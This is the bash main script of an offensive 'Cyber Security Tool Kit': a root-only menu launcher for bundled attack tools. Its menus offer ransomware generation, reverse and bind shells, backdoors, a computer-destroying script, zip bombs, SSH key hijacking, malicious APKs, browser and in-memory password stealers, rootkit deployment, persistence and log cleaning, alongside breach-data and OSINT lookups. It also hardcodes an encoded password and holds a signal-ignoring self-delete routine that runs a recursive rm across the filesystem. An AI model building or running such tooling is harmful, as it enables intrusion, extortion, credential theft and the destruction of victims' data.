#!/bin/bash

#set -o pipefail

# colors
r=$'\e[1;31m' # red
g=$'\e[1;32m' # green
y=$'\e[1;33m' # yellow
b=$'\e[1;34m' # blue
p=$'\e[1;35m' # purple
c=$'\e[1;36m' # cyan
x=$'\e[0m' # reset

# Date for log files
DATE=$(date)
# Find true user path for downloaded files
real_full_path="$(realpath /usr/local/bin/cstk)"
home_dir="$(dirname "$real_full_path")"
home="$home_dir/$0"
hash_home="$home_dir/Other/SecurityChecks"
# Parent folder and children
tools="$home_dir/doc" # used for markdown files
data="$home_dir/data" # used for tool breached parser
log="$home_dir/log" # used for the log files
Malware="$home_dir/Bank/Malware" # Used to store user created Malware
Loot="$home_dir/Bank/Loot" # Used for important finding
Keys="$home_dir/etc/keys" # used for storage of openssl keys and encoding
installer="$home_dir/install.sh" # the install.sh script
# /usr/local/bin wrapper script for the cstk bin folder to easily make all bin files executable
# bin folder for all the tools
bin="$home_dir/bin"
cstk_wrapper="/usr/local/bin/cstk_wrapper"
breach_parse_bin="$bin/breach_parse"
breach_parse_single_bin="$bin/breach_parse_single"
openssl_helper_bin="$bin/openssl_helper"
gpg_help_bin="$bin/gpg_enc_dec"
browser_stealer_bin="$bin/browser_thief"
nmap_bin="$bin/IP-Sweeper-Wizard"
filesofinterest_bin="$bin/filesofinterest"
sweeper_bin="$bin/sweeper"
make_shells_bin="$bin/make_shells"
msb="$bin/msb"
enum_bin="$bin/enum"
userland_rootkit_bin="$bin/userland_rootkits"
kernel_rootkit_bin="$bin/kernel_rootkits"
dos_bombs_bin="$bin/unzip_bomb"
linux_exploit_checker_bin="$bin/linux_exploit_checker"
lecb="$bin/linux_X_check"
ssh_attack_bin="$bin/make_ssh_keys"
msfvenom_bin="$bin/msf_payload_creater"

# source the tab completion script in the bin folder
source "$bin/tab_complete.cstk"
# Other bin files not used by the wrapper
GTFOB="$bin/GTFOB"
firefox_stealer="$bin/firefox_stealer"
linux386="$bin/hack-browser-data-linux-386"
linuxamd="$bin/hack-browser-data-linux-amd64"
linuxarm="$bin/hack-browser-data-linux-arm64"
osx="$bin/hack-browser-data-osx-64bit"
win32="$bin/hack-browser-data-windows-32bit.exe"
win64="$bin/hack-browser-data-windows-64bit.exe"
parsebookmarks="$bin/parse_bookmark"
parsecookies="$bin/parse_cookie"
parsedownloads="$bin/parse_download"
parseext="$bin/parse_extension"
parsehistory="$bin/parse_history"
parsepasswords="$bin/parse_password"
pass_attack="$bin/password_attack"
apk_builder_bin="$bin/apk_builder"
auto_vuln_find="$bin/auto_vuln_finder"
log_clean_bin="$bin/log_cleaner"
# lib folders files used for copy/paste to create mostly payloads and ransomware
lib="$home_dir/lib"
NetcatBindShell="$lib/NetcatBindShell"
ncbo="$lib/NetcatBindShell-X-encoded"
ncb="$lib/HCDOUNASIXNTM7Q3YR-X-encoded.enc"
NetcatRevShell="$lib/NetcatReverseShell"
ncro="$lib/NetcatRevShell-X-encoded"
ncr="$lib/QI2NTM7Q3YRVBGDBR-X-encoded.enc"
LinuxRevShell="$lib/LinuxReverseShell"
rvso="$lib/LinuxRevShell-X-encoded"
rvs="$lib/YXOKETATIH4WMF4KG-X-encoded.enc"
RansomEncrypt="$lib/RansomwareEncryptScript"
rweo="$lib/RansomDirty-X-encoded"
rwe="$lib/WAHCDOUNASIXWNVBKYNTW-X-encoded.enc"
RansomDecrypt="$lib/RansomwareDecryptScript"
rwdo="$lib/RansomClean-X-encoded"
rwd="$lib/TCAOMB3MU7XN3A6HGKLI2ZYDJ-X-encoded.enc"
RansomEncryptGo="$lib/Ransomware_Encrypt.go"
rwgo="$lib/RansomCleanGo-X-encoded"
rwg="$lib/pEvAOjfBikdPKoXzqwqGlEGdaROaibAO-X-encoded.enc"
RansomwareEGo="$lib/Ransomware_Encrypt"
RansomwareEGoW="$lib/Ransomware_Encrypt.exe"
RansomDecryptGo="$lib/Ransomware_Decrypt.go"
rdgo="$lib/RansomDecrypt-X-encoded"
rdg="$lib/STNSNkFPTYCYwDYSEGkHMVsNxuYPwJYc-X-encoded.enc"
RansomwareDGo="$lib/Ransomware_Decrypt"
RansomwareDGoW="$lib/Ransomware_Decrypt.exe"
NoTouchScript="$lib/NoTouchScript"
ntso="$lib/NoTouchScript-X-encoded"
nts="$lib/6UR4STTDXCBXV7NYNZTDTRKFQ-X-encoded.enc"
DestroyTheComputer="$lib/destroy_computer"
dtco="$lib/destroy_computer-X-encoded"
dtc="$lib/IXNTM7QIXWNVBKYNTTATIH4STTDXC-X-encoded.enc"
zip2go_enc="$lib/cstk_postxzipkit"
zip2go="$Malware/cstk_Post_x_Kit.zip"
. "$lib/arguments_frame"
. "$lib/Fonts"
breached_data="$data"
pswd="$(echo 'QURBTUFEQU1BRE1BTURBTURBRE1BTURNQURNQU1ETURNQURNQU1ES0FES0FOS0FOQUtETkFLRE5LQU5BREFJREFJT0RISURPSEFPSUhESU9IQU9JQUhET0lIRElPQTMzMgo=' | base64 -d)"
help_file="$bin/help_file"

# Most used function wait for script to end and return to main_menu
wait_and_return() {
	echo -e "$r\nPress: 'X' to Exit $b \n\nEnter/Return for main menu.\n\n $x"
    read -r -n 1 -p "${c} ${A} ${x}" op
    if [[ "$op" =~ [Xx] ]]; then
	    exit
    fi
    main_menu
}

show_help() {
    bash "$help_file"
}
# Function to delete all files and directories created by the script
# This function is called when the sha256sum files dont match up with the hashes saved during the install.sh process.
delete_me_now() {
        trap '' SIGINT SIGQUIT SIGILL SIGTERM SIGCONT SIGABRT SIGCHLD SIGHUP SIGTSTP SIGTTIN SIGTTOU
		if [ -d /opt/cstk ] || [ -d /opt/cstk/shc ]; then
        	rm -rf /opt/cstk &>/dev/null
            if [ -f /usr/local/bin/shc ]; then
                rm -rf /usr/local/bin/shc &>/dev/null
            fi
        fi
        rm -rf /usr/local/bin/cstk &>/dev/null
        rm -rf /usr/local/bin/cstk_wrapper &>/dev/null
        find / -type d -name CyberSecurityToolKit -exec rm -rf {} &>/dev/null \;
        rm -rf "$0" &>/dev/null
}
# Function to check the sha256sum of the files and directories
check_hash() {
    sha256sum -c --quiet "$hash_home/sha256.checksum"
    status="$?"
    if [[ "$status" != 0 ]]; then
        echo -e "$r corrupt files detected \n Going into delete mode"
        delete_me_now
    fi
}
# Function to display a random header from the Fonts library
header() {
    random=$(cat /dev/urandom | tr -cd '1-8' | head -c 1)
    case $random in
        1) braille_fonts ;;
        2) digital_fonts ;;
        3) emboss_fonts ;;
        4) future_fonts ;;
        5) letter_fonts ;;
        6) pagga_fonts ;;
        7) script_fonts ;;
        8) term_fonts ;;
        *) echo "" ;;
    esac
}

# Logos Pictures Error pic
function logo_error() {
echo -e ' \n\n\n

\t\t\t\t                              ______
\t\t\t\t                           .-"      "-.
\t\t\t\t                          /            \
\t\t\t\t              _          |              |          _
\t\t\t\t             ( \         |,  .-.  .-.  ,|         / )
\t\t\t\t              > "=._     | )(__/  \__)( |     _.=" <
\t\t\t\t             (_/"=._"=._ |/     /\     \| _.="_.="\_)
\t\t\t\t                    "=._"(_     ^^     _)"_.="
\t\t\t\t                        "=\__|IIIIII|__/="
\t\t\t\t                       _.="| \IIIIII/ |"=._
\t\t\t\t             _     _.="_.="\          /"=._"=._     _
\t\t\t\t            ( \_.="_.="     `--------`     "=._"=._/ )
\t\t\t\t             > _.="                            "=._ <
\t\t\t\t            (_/                                    \_)
\t\t\t\t                      Cyber Security Tool Kit
'
}
# Function to display the main logo of the Cyber Security Tool Kit
function logo_main2() {
echo -e "\n\n\n $r
\t\t$r ###################################################################################################################################
\t\t$x # $g	   ______      __                   _____                      _ __             ______            __     __ __ _ __    $x    #
\t\t$x # $b	  / ____/_  __/ /_  ___  _____     / ___/___  _______  _______(_) /___  __     /_  __/___  ____  / /    / //_/(_) /_   $x    #
\t\t$x # $r	 / /   / / / / __ \/ _ \/ ___/     \__ \/ _ \/ ___/ / / / ___/ / __/ / / /      / / / __ \/ __ \/ /    / ,<  / / __/   $x    #
\t\t$x # $p	/ /___/ /_/ / /_/ /  __/ /        ___/ /  __/ /__/ /_/ / /  / / /_/ /_/ /      / / / /_/ / /_/ / /    / /| |/ / /_     $x    #
\t\t$x # $c	\____/\__, /_.___/\___/_/        /____/\___/\___/\__,_/_/  /_/\__/\__, /      /_/  \____/\____/_/    /_/ |_/_/\__/     $x    #
\t\t$x # 	     /____/                                                      /____/                                                $x    #
\t\t$b ################################################################################################################################### $x"
}
# Function to display the OSINT logo
function logo_osint() {
echo -e "\n\n\n $c
\t\t	   ____     _____    ____   _   __   ______ $x
\t\t	  / __ \   / ___/   /  _/  / | / /  /_  __/ $g
\t\t	 / / / /   \__ \    / /   /  |/ /    / /    $b
\t\t	/ /_/ /   ___/ /  _/ /   / /|  /    / /     $r
\t\t	\____/   /____/  /___/  /_/ |_/    /_/      $p
\t\t                                                $x"
}
# Function to display the Payloads logo
function logo_payload() {
echo -e "\n\n\n $g
\t\t	    ____  _____  ____    ____  ___    ____  _____ $b
\t\t	   / __ \/   \ \/ / /   / __ \/   |  / __ \/ ___/ $r
\t\t	  / /_/ / /| |\  / /   / / / / /| | / / / /\__ \  $b
\t\t	 / ____/ ___ |/ / /___/ /_/ / ___ |/ /_/ /___/ /  $p
\t\t	/_/   /_/  |_/_/_____/\____/_/  |_/_____//____/   $c
\t\t                                                      $x"
}
# Function to display the Post Exploit logo
function logo_postexploit() {
echo -e "\n\n\n $p
\t\t	    ____  ____  ___________   _______  __ ____  __    ____  __________ $g
\t\t	   / __ \/ __ \/ ___/_  __/  / ____/ |/ // __ \/ /   / __ \/  _/_  __/ $b
\t\t	  / /_/ / / / /\__ \ / /    / __/  |   // /_/ / /   / / / // /  / /    $c
\t\t	 / ____/ /_/ /___/ // /    / /___ /   |/ ____/ /___/ /_/ // /  / /     $r
\t\t	/_/    \____//____//_/    /_____//_/|_/_/   /_____/\____/___/ /_/      $x"
}
# Function to display the Etc logo
function logo_etc() {
echo -e "\n\n\n $g
\t\t	    ______   ______   ______ $b
\t\t	   / ____/  /_  __/  / ____/ $c
\t\t	  / __/      / /    / /      $p
\t\t	 / /___     / /    / /___    $r
\t\t	/_____/    /_/     \____/    $x"
}
# Function to display the help logo
function logo_help() {
echo -e "\n\n\n $b
\t\t  	    _/    _/$g  _/_/_/_/$c  _/    $r    _/_/_/  $b
\t\t	   _/    _/ $g _/      $c  _/     $r   _/    _/ $b
\t\t	  _/_/_/_/$g  _/_/_/  $c  _/      $r  _/_/_/    $b
\t\t	 _/    _/$g  _/      $c  _/     $r   _/         $b
\t\t	_/    _/$g  _/_/_/_/$c  _/_/_/_/$r  _/          $x"
}

# Make sure we are root or have sudo permissions
check_root() {

    if [[ "$EUID" -ne 0 ]]; then
	    echo -e "sudo or root needed to run script"
	    exit 1
    fi
}
# Function to create a new user and password for the CyberSecurityToolKit
user_create_password() {
    set -euo pipefail
    get_new_user_pass() {
        echo -e "\n🔐 Enter new username:"
        read -r user
        if grep -q "^${user}[[:space:]]" "$hash_file"; then
            echo -e "\n⚠ User already exists. Try another.\n"
            get_new_user_pass
        fi
        while true; do
            echo -n "🔑 Enter new password: "
            read -r -s password
            echo
            echo -n "🔁 Re-enter password to confirm: "
            read -r -s password2
            echo

            [[ "$password" == "$password2" ]] && break
            echo -e "\n❗ Passwords do not match. Try again.\n"
        done

        hash=$(echo -n "$password" | openssl dgst -sha256 -binary | openssl enc -base64 -A | awk '{print $1}')
        echo -e "$user\t\t$hash" >> "$hash_file"
        echo -e "\n✅ User '$user' added successfully!\n"
        sudo bash -c "${BASH_SOURCE[0]}" 
        exit 0
    }
    # Function to get user and password for the CyberSecurityToolKit

    get_user_pass() {
        echo -e "\n👤 Enter Username: "
        read -r user

        if ! grep -q "^${user}[[:space:]]" "$hash_file"; then
            echo -e "\n⚠  Username not found. Register new user? (Y/n): "
            read -r ans
            ans=${ans,,}  # force lowercase
            if [[ "$ans" == "y" ]]; then
                get_new_user_pass
            else
                get_user_pass
            fi
        fi

        local max_attempts=3
        local attempts=0
        # Loop to get password from user
        while (( attempts < max_attempts )); do
            echo -ne "\n🔐 Enter password: "
            read -r -s pass
            echo
            # Hash the entered password and compare with stored hash
            entered=$(echo -n "$pass" | openssl dgst -sha256 -binary | openssl enc -base64 -A | awk '{print $1}')
            stored_hash=$(grep "^${user}[[:space:]]" "$hash_file" | awk '{print $2}')
            # Check if the entered password matches the stored hash
            if [[ "$entered" == "$stored_hash" ]]; then
                echo -e "\n✅ Access granted"
                sleep 1
                return 0
                header
                main_menu
            else
            # Increment attempts and log the failed attempt
                ((attempts++))
                echo -e "\n❌ Incorrect password ($attempts/$max_attempts)"
                echo "$user failed login at $(date)" >> "$log/login_attempts.log"
                [[ $attempts -lt $max_attempts ]] && sleep 5
            fi
        done
        # If max attempts reached, lock out the user
        echo -e "\n🔒 Too many failed attempts. Access denied."
        cooldown=600  # seconds
        trap '' SIGINT SIGQUIT SIGILL SIGTERM SIGCONT SIGABRT SIGCHLD SIGHUP SIGTSTP SIGTTIN SIGTTOU
        echo -e "\n⏱ Locking out for $cooldown seconds..."
        sleep "$cooldown"
        get_user_pass
    }

    # Create the hash file if it does not exist
    hash_file="$log/hash_list.txt"
    [[ -f "$hash_file" ]] || touch "$hash_file" && chmod 600 "$hash_file"

    get_user_pass 
}

A="${p}CSTK ==> ${x}"
AO="${c}CSTK->OSINT ==> ${x}"
ao="${p}CSTK->OSINT->"
AP="${c}CSTK->PAYLOADS ==> ${x}"
ap="${p}CSTK->PAYLOADS->"
AX="${c}CSTK->POST EXPLOIT ==> ${x}"
ax="${p}CSTK->POST EXPLOIT->"
AE="${c}CSTK->ETC ==> ${x}"
ae="${p}CSTK->ETC->"
# Main Page when calling script with out any arguements
function main_menu() {
clear
logo_main2
check_root
check_hash
echo -e "\n
$g
\t\t\t        Enter Class Number: \n\n $b
\t\t\t        1 -$p OSINT        \n $b
\t\t\t        2 -$p PAYLOADS     \n $b
\t\t\t        3 -$p POST EXPLOIT \n $b
\t\t\t        4 -$p ETC \n $r
\t\t\t        X - exit $x\n"

echo -e "\n\n"
read -r -n 1 -p "${g} ${A} ${x}" num
case "$num" in
    [1-4]) handle_input "$num" ;;
    [Xx]) exit 0 ;;
    *) main_menu ;;
esac
}
# second option for tools usage options on main script
function handle_input() {
    clear
    case "$1" in

        1) logo_osint ;A="$AO"; echo -e "$c \n\n Enter OSINT Tool Number: $b

        1 -$g ip address lookup$p 		(GPS Coordinates, city, state, ISP) $b

        2 -$g ping sweeper tool$p 		(ping sweep last octet 256 address range) $b

        3 -$g nmap tool$p 			(helpful automated nmap script) $b

        4 -$g auto enum $p                  (nslookup,dig,sublist3r,mysql,nikto,gobuster,wpscan and more all automated) $b

        5 -$g pawned email check$p		(check __@domain.com breached email/password combos or a single email) $b

        6 -$g google dorks helper$p		(search for passwords, exploits, vulnabilites with over 7000 different search terms) $b

        7 -$g email search tool$p           (search for a email linked to 100+ social media accounts) $b

        8 -$g password attack tool$p        (crack online/offline passwords using a number of different tools) $r

        X - Back to main menu$x" ;;
        2) logo_payload ;A="$AP"; echo -e "$b \n\n Enter Payload Tool Number: $g

        1 -$p Encrypted netcat shell$c 		(create a nc binding/reverse script) $g

        2 -$p Back door creation tool$c 		(create a Linux reverse shell script with 30+ exploits) $g

        3 -$p Ransomware scripts$c 			(create both a Ransomware encryption/decryption shell script) $g

        4 -$p Multi OS reverse shells$c 		(android, windows, ngrok, hex, much more) $g

        5 -$p No touch disk payload$c		(create a payload that runs in memory) $g

        6 -$p Destroy Computer$c 			(create a executable script if ran will destroy a linux computer) $g

        7 -$p Start a DoS Bomb$c 			(Start a zip bomb or picture bomb that will overload the memory causing computer to crash) $g

        8 -$p SSH Payload script$c                  (malicious script to remove and create new .ssh directory adding your private key and restrict access to everyone) $g

        9 -$p Metasploit (msfvenom)$c               (create a shell script for remote connection using msfvenom and metasploit)$g

        A -$p APK Builder$c                         (create a malicious apk for remote access)$r

    	X - Back to main menu $x" ;;
        3) logo_postexploit ;A="$AX"; echo -e "$r \n\n Enter Exploit Tool Number: $p

        1 -$c Check if on VM $g			(Did i gain a shell on a Virtual Machine) $p

        2 -$c Web browser info stealer$g 		(Firefox, Chrome, Edge, and other browsers to gather passwords cookies history addons and more) $p

        3 -$c Crypto Regex Search$g 		(find Bitcoin, Dodge, Eth, Lite, plus Many More crypto wallets) $p

        4 -$c File Permissions Exploitation$g 	(Sudo Root Permissions Exploit) $p

        5 -$c Check Kernel Exploits$g 		(checks for kernel exploits on the current computer) $p

        6 -$c Embed a command on start up$g		(Embed a command that runs every time system starts) $p

        7 -$c Brute Force a locked file$g       	(Brute force a zip or rar password protected file using a password list) $p

        8 -$c Files of Interest$g              	(Find Interesting files on Linux systems) $p

        9 -$c Deploy a Rootkit$g			(Setup and run a Rootkit on the current computer) $p

        A -$c In-Memory Password Stealer$g          (Root permission is needed - steal the current users passwords that is currently in memory)$r

        X - Back to main menu$x" ;;
        4) logo_etc ;A="$AE"; echo -e "$c \n\n Enter Tool Number: $g

        1 -$p Users and Shell's $b 		(find all users and their default shells local computer) $g

        2 -$p Python Web server $b 		(start a webserver for File Transfers) $g

        3 -$p Extract Archive file's $b 	(open a tar, 7z, zip, dpkg, plus many more archives - non password protected ) $g

        4 -$p Openssl Helper  $b 		(multi use tool to create public/private key pairs - hash passwords, create/verify checksums, encrypt/decrypt a single file - random byte gen) $g

        5 -$p Secret Message $b         	(create/decode a gpg key look-a-alike that is actually a secret message) $g

        6 -$p Create Binary $b		(Takes in a bash/sh shell script encodes, encrypts, and creates a executable binary file) $g

        7 -$p Post Ex 2 go $b               (A zip archive with all the needed tools for post exploit work on a remote computer) $g

        8 -$p Array Encryption Script $b    (Create a hard to read executable script using arrays of user choosen command) $g 

        9 -$p Log Cleaning Tool $b          (Creates and runs a program to clean users logs) $r

        X - Back to main menu $x" ;;
        *) main_menu ;;
esac
echo

read -r -n 1 -p "${r} ${A} ${x}" choice
execute_tool "$1" "$choice"
}

# Main function to call the program that user wants to run
function execute_tool() {
case "$1" in
    1) case "$2" in
        1) find_that_ip ;;
        2) sweep_ip ;;
        3) nmap_tool ;;
        4) enum_tool ;;
        5) breach_parse_wrapper ;;
        6) google_dorks ;;
        7) email_search ;;
        8) pass_attack ;;
        X|x) main_menu ;;
        *) main_menu ;;
       esac ;;
    2) case "$2" in
        1) netcat_choice ;;
        2) rev_shells ;;
        3) ransomware_shell_options ;;
        4) rev_shells_all ;;
        5) no_touch_script ;;
        6) destroy_computer ;;
        7) dos_bomb_attack ;;
        8) ssh_attack ;;
        9) msf_payloads ;;
        A|a) apk_killer ;;
        X|x) main_menu ;;
        *) main_menu ;;
       esac ;;
    3) case "$2" in
        1) check_vm ;;
        2) browser_data_wrapper ;;
        3) crypto_catch ;;
        4) check_gtfob ;;
        5) linux_exploits_check ;;
        6) startup_command ;;
        7) brute_force_file ;;
        8) files_of_interest ;;
        9) deploy_rootkit ;;
        A|a) inmem_password_stealer ;;
        X|x) main_menu ;;
        *) main_menu ;;
       esac ;;
    4) case "$2" in
        1) users_and_shells ;;
        2) py_web_server ;;
        3) extract_arch ;;
        4) r_b_g_wrapper ;;
        5) gpg_lookalike_wrapper ;;
        6) create_exe_binary ;;
        7) post_x_2_go ;;
        8) array_enc_script ;;
        9) log_cleaning_tool ;;
        X|x) main_menu ;;
        *) main_menu ;;
       esac ;;
    *) main_menu ;;
esac

}

# Bad option function for tool numbered choices

error_font() {
    logo_error
    echo -e "$r \nBad Option: Returning to Main Menu \n $x "
    wait_and_return
}

# Used to store user IP address and chosen port for Payloads, Shells, etc
getip() {
    clear
    ans=""
    # Function to retrieve external IP
    X_ip=$(dig -4 @resolver1.opendns.com ANY myip.opendns.com +short)
    L_ip=$(ip addr show | grep "inet " | grep -v "127.0.0.1" | awk '{print $2}' | tr '/' ' ' | awk '{print $1}')
    declare -a ARRAY
    ARRAY=( "\n" "$X_ip" "\n" "$L_ip" "\n" "Other (Enter manually)" )
    clear
    echo -e "$c\nEnter the IP address to use. Options are: \n ${ARRAY[*]} $x"
    read -r -p "${g} ${A} ${x}" chosen_ip

    # Verify the chosen IP is either in the list or a valid format
    if [[ "$chosen_ip" != "$X_ip" && "$chosen_ip" != "$L_ip" ]]; then
        if ! [[ "$chosen_ip" =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ ]]; then
            if [[ "$chosen_ip" =~ ^[Oo] ]]; then   # Check for "Other", "other", "O", "o"
                read -r -p "${g}Enter the IP address manually: ${x}" chosen_ip
            else
                echo -e "$r\nInvalid IP address format. $x"
                exit 3
            fi
        fi
    fi

    clear
    # User selects port number
    echo -e "$c Enter port number to use if needed. (1-65535): $x"
    read -r -p "${b} ${A} ${x}" chosen_port
    while ! [[ "$chosen_port" =~ ^[1-9][0-9]{0,4}$ && "$chosen_port" -ge 1 && "$chosen_port" -le 65535 ]]; do
        echo -e "$r Incorrect option: Pick a number between 1 and 65535. $x"
        read -r -p "Enter your port number choice for reverse connect back (1-65535): " chosen_port
    done
    clear
    echo -e "\n$c You have selected IP and PORT: $chosen_ip:$chosen_port $x\n"
    echo -e "$c Is this Correct? Y/N $x\n"
    read -r -p "${c}==> ${x}" ans
    while ! [[ "$ans" =~ [YyNn] ]]; do
        echo -e "$r Invalid input. Please enter Y or N. $x"
        read -r -p "Enter Y/N: " ans
        if [[ "$ans" =~ [Nn] ]]; then
            break
        fi
    done
    declare -g chosen_ip="$chosen_ip"
    declare -g chosen_port="$chosen_port"

}

############################## OSINT FUNCTIONS ###########################3
# Class:OSINT - Tool:IP Lookup - Option 1
# Function to find IP address information
# Uses ip-api.com and shodan.io to gather information about the IP address
# Requires jq for JSON parsing
# Requires curl for making HTTP requests
# Saves the output to Loot/IP-Lookup.txt
# Displays the information in a formatted manner
# If jq is not installed, it will display an error message and exit
# If the IP address lookup is successful, it will display the city, state, country,
# zip code, latitude, longitude, and ISP information
# If the lookup fails, it will display an error message and save the failure to Loot/IP-Lookup.txt
# Requires the Loot directory to exist for saving the output
find_that_ip() {
    A="$ao IP Lookup ==>${x}"
    clear
    osint_findip_frame
    if ! command -v jq &> /dev/null; then
        echo -e 'Error: Looks as if jq is not installed. \nDid you delete? \nShould of downloaded with the install script.'
        exit 2
    fi
    echo -e "$g \nProvide A IP address for look up:\n $x"
    read -r -p "${c} ${A} ${x}" Ip
    data=$(curl -s "http://ip-api.com/json/$Ip")
    data2=$(curl -s "https://internetdb.shodan.io/$ip")
    status=$(echo "$data" | jq -r '.status')
    ports=$(echo "$data2" | jq -r '.ports' | tr -d '[]' | tr -d "[:space:]")
    vuln=$(echo "$data2" | jq -r '.vulns' | tr -d '[]' | tr -d "[:space:]")
    if [[ $status == "success" ]]; then
    	clear
        city=$(echo "$data" | jq -r '.city')
        regionName=$(echo "$data" | jq -r '.regionName')
        country=$(echo "$data" | jq -r '.country')
        zip=$(echo "$data" | jq -r '.zip')
        lat=$(echo "$data" | jq -r '.lat')
        lon=$(echo "$data" | jq -r '.lon')
        isp=$(echo "$data" | jq -r '.isp')
        echo -e "\n\nDate and Time: \t\t\t  $DATE \nUser Name:\t\t\t  $SUDO_USER \nScript Ran:\t\t\t  IP Search \nSearched IP:\t\t\t  $Ip \n--------------------------------------------------------- \nCity:\t\t\t\t  $city \nState:\t\t\t\t  $regionName \nCountry:\t\t\t  $country \nZip:\t\t\t\t  $zip \nLatitude:\t\t\t  $lat \nLongitude:\t\t\t  $lon \nInternet Service Provider:\t  $isp\nOpen Ports:\t\t\t  $ports\nPossible Vulnabilities:\t\t\t  $vuln" | tee -a "$Loot/IP-Lookup.txt"
    	echo -e "$g\nInformation saved in $Loot/IP-Lookup.txt $x"
    else
        echo -e "$r Failed to retrieve information. $x"
    	echo -e "\n\nDate and Time: $DATE \nUser Name: $USER \nScript Ran: IP Searcher \nSearched IP: $Ip \nResults: Failed to retrieve information." >> "$Loot/IP-Lookup.txt"
    fi

wait_and_return
}

# Class:OSINT - Tool:Ping Sweeper - Option 2 (Wrapper used)
# Function to perform a ping sweep on the last octet of an IP address range
# Uses a custom sweeper script to ping all addresses in the range
# Requires the sweeper script to be executable
# Saves the output to Loot/IP-Sweep.txt
# Displays the results in a formatted manner
# If the sweeper script is not found, it will display an error message and exit
sweep_ip() {
    clear
    osint_ipsweep_frame
    sleep 5
    export CSTK_MAIN_RUNNER=1
    "$cstk_wrapper" "$sweeper_bin"
    wait_and_return
}

# Class:OSINT - Tool:Nmap helper script - Option 3  (Wrapper used)
# Function to run a helpful Nmap script
# Uses a custom Nmap script to automate common Nmap tasks
# Requires the Nmap script to be executable
# Saves the output to Loot/Nmap-Helper-Script.txt
# Displays the results in a formatted manner
# If the Nmap script is not found, it will display an error message and exit
nmap_tool() {
    clear
    osint_nmap_frame
    sleep 5
    export CSTK_MAIN_RUNNER=1
    "$cstk_wrapper" "$nmap_bin"
    printf "Date and Time: %s\nUser Name: %s\nScript Ran: Nmap-Helper-Script\n" "$DATE" "$USER" >> "$log/nmap_helper_script_results.log"
    wait_and_return
}

# Class:OSINT - Tool:Automative Enumeration Script - Option 4 (Wrapper used)
# Function to run an automated enumeration script
# Uses a custom enumeration script to gather information about a website
# Requires the enumeration script to be executable
# Saves the output to Loot/Auto-Enumeration.txt
# Displays the results in a formatted manner
# If the enumeration script is not found, it will display an error message and exit
# The script will prompt the user for a website URL to enumerate
# The script will run various tools such as nslookup, dig, sublist3r, mysql, nikto, gobuster, wpscan, and more
# The results will be saved to Loot/Auto-Enumeration.txt
# The script will also log the date, time, user name, and script run information to auto_enum_script.log
# The script will wait for the user to press a key before returning to the main menu
enum_tool() {
    A="$ao Enumeration ==> ${x}"
    clear
    osint_enum_frame
    sleep 5
    export CSTK_MAIN_RUNNER=1
    echo -e "\nEnter Website URL: \nExample hackersunit.com \n"
    read -r -p "${c} ${A} ${x}" dom
    "$cstk_wrapper" "$enum_bin" "$dom" -a
    printf "Date and Time: %s\nUser Name: %s\nScript Ran: Automative Enumeration Script\n" "$DATE" "$USER" >> "$log/auto_enum_script.log"
    wait_and_return
}

# Class:OSINT - Tool:Email Parser - Option 5 (Wrapper used)
# Function to parse breached email addresses and passwords
# Uses a custom breach parser script to search for breached email addresses
# Requires the breach parser script to be executable
# The script will prompt the user for an email address or domain to search for
# If the user chooses to search for a single email address, it will search the breached email/password lists for that email
# If the user chooses to search for a full domain, it will search the breached email/password lists for all email addresses associated with that domain
# The results will be displayed in a formatted manner
# If the breach parser script is not found, it will display an error message and exit
# The script will wait for the user to press a key before returning to the main menu
breach_parse_wrapper() {
    A="$ao Breach Parser ==> ${x}"
    clear
    if ! [ -d "$data" ]; then
     	echo -e "$r \nLooks like you did not allow for the download of breached email/password lists when running the install.sh script \nOr you did not have enough space available for the large download. $g\nYou can not run this program. $x"
    	wait_and_return
    fi
    osint_breached_frame
    sleep 5
    echo -e "$g \nAre you searching for: $r \n1 -$p single breached email account $r \n2 -$p full breached domain email accounts $r \n3 -$p main menu $x"
    read -r -n 1 -p "${c} ${A} ${x}" opt
    if [ "$opt" -eq 1 ]; then
    	echo -e "$g \nEnter the email address to search $x"
    	read -r -p "${c} ${A} ${x}" email
    	export CSTK_MAIN_RUNNER=1
    	"$cstk_wrapper" "$breach_parse_single_bin" "$email"
    elif [ "$opt" -eq 2 ]; then
    	export CSTK_MAIN_RUNNER=1
    	"$cstk_wrapper" "$breach_parse_bin"
    else
    	main_menu
    fi
    wait_and_return
}

# Class:OSINT - Tool:Google Dorks - Option 6
# Function to search for Google Dorks
# Uses fzf to allow the user to select a category of dorks
# The categories include Basic, Special, Full, and Advanced
# Each category has a corresponding file containing dork patterns
# The user can search within the selected file using fzf
# If the user selects a dork, it will be displayed in the terminal
# If the user selects "Back", it will return to the main menu
# If the user selects an invalid option, it will prompt them to try again
# The script will wait for the user to press a key before returning to the main menu
# The dorks are stored in separate files for each category
# The Basic category contains common dork patterns
# The Special category contains dorks that start with a special character
# The Full category contains a comprehensive list of over 7000 dorks
# The Advanced category contains advanced Google dorks
# The script will check if the selected file exists before proceeding
# If the file does not exist, it will display an error message and exit
# The script will also display a frame with the title "Google Dorks Helper"
google_dorks() {
    clear
    osint_googledorks_frame
    sleep 5

    # Define the file paths
    BASIC_FILE="$lib/GD_Basic.txt"
    SPECIAL_FILE="$lib/GD_Special.txt"
    FULL_FILE="$lib/GD_Full_List.txt"
    ADVANCED_FILE="$lib/GD_Advanced.txt"
    # Loop for the category selection, allowing the user to go back
    while true; do
        # Use fzf to allow the user to select a category or back out
        CATEGORY=$(echo -e "\nBasic\nSpecial\nFull\nAdvanced\nBack" | fzf --prompt="Select dork category (Basic: dork patterns) (Special: start with special character) (Advanced: Advanced google dorks) (Full: Full List 7000+) (or Back to exit): ")
        # Map the selected category to the corresponding file
        case $CATEGORY in
            Basic)
                FILE=$BASIC_FILE
                ;;
            Special)
                FILE=$SPECIAL_FILE
                ;;
            Full)
                FILE=$FULL_FILE
                ;;
            Advanced)
            	FILE=$ADVANCED_FILE
            	;;
            Back | "")
                echo -e "$r \nExiting or no selection made. Exiting. $x"
                wait_and_return
                ;;
            *)
                echo -e "$r \nInvalid selection. Please try again. $x"
                continue
                ;;
        esac
        # Check if the file exists
        if [[ ! -f $FILE ]]; then
            echo -e "$r \nFile $FILE not found. Exiting. $x"
            exit 1
        fi
        # Use fzf to allow the user to search within the selected file
        echo -e "$p \nSearching within $x $CATEGORY $p dorks... $x"
        SELECTED_DORK=$(fzf --prompt="Search $CATEGORY dorks (or press Esc to go back): " < "$FILE")
        # If the user presses Esc or selects nothing, loop back to the category selection
        if [[ -z $SELECTED_DORK ]]; then
            echo -e "$r \nNo dork selected, returning to category selection... $x"
            continue
        fi
        # Display the selected dork
        echo -e "$g \nSelected dork: $x $SELECTED_DORK"
        break
    done
    wait_and_return
}

